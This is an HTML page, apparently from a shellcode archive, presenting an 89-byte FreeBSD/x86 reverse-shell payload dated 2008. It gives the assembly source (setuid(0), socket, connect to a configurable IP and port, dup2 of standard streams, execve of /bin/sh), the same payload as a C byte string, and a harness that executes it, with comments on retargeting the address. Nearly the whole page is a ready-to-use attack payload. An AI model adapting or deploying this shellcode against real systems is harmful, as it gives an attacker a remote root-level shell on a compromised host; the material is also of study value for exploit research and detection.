<html><head><title>FreeBSD/x86 - reverse portbind /bin/sh - 89 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; sm4x - 2008
; reverse portbind /bin/sh
; NULL free if address is.
; setuid(0); socket(); connect(); exit();
; 89 bytes
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
push    eax
int     0x80

; --- socket()
push    eax
push    byte 0x01
push    byte 0x02
mov     al, 0x61
push    eax
int     0x80
mov     edx, eax

; --- sockaddr_in
push    0x0100007f      ; 1.0.0.127 nb: to change see below
push    0x401f02AA      ; 8000 nb: change (watch for .10 .0 etc..)
mov     eax, esp

; --- setup connect(edx, eax, 0x10);
push    byte 0x10
push    eax
push    edx
xor     eax, eax
mov     al, 0x62
push    eax
int     0x80

; -- dup2(0+1+2)..
mov     cl, 0x03
xor     ebx, ebx
dups:
push    ebx
push    edx
mov     al, 0x5a
push    eax
int     0x80
inc     ebx
loop   dups

xor     eax, eax
push    eax     ; null
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp

; --- execve()
push    ebx
push    eax
push    esp
push    ebx
mov     al, 0x3b
push    eax
int     0x80

; --- exit
xor     eax, eax
push    eax
push    eax
int     0x80

/*

char code[] = &quot;\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80&quot;
       &quot;\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd&quot;
       &quot;\x80\x89\xc2\x68\x7f\x00\x00\x01\x68&quot;
       &quot;\x00\x02\x1f\x40\x89\xe0\x6a\x10\x50&quot;
       &quot;\x52\x31\xc0\xb0\x62\x50\xcd\x80\xb1&quot;
       &quot;\x03\x31\xdb\x53\x52\xb0\x5a\x50\xcd&quot;
       &quot;\x80\x43\xe2\xf6\x31\xc0\x50\x68\x6e&quot;
       &quot;\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&quot;
       &quot;\xe3\x53\x50\x54\x53\xb0\x3b\x50\xcd&quot;
       &quot;\x80\x31\xc0\x50\x50\xcd\x80&quot;;

int main(int argc, char **argv) {

    	/* used to get ip:port combo for pushes */
        char *ip_addr = &quot;127.0.0.1&quot;; // watch for addresses that create \x00 and others
        int port = 8000;
        struct sockaddr_in dest;

        printf(&quot;IP: %s\n&quot;, ip_addr);
        printf(&quot;PORT: %d\n&quot;, port);

        dest.sin_family = AF_INET;
        dest.sin_port=htons(port);
        dest.sin_addr.s_addr = inet_addr(ip_addr);

        printf(&quot;push 0x%x\t; host\n&quot;, dest.sin_addr.s_addr);
        printf(&quot;push 0x%x02AA\t; port\n&quot;, dest.sin_port);

        int (*func)();
        printf(&quot;Bytes: %d\n&quot;, sizeof(code));
        func = (int (*)()) code;
        (int)(*func)();
}

*/


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
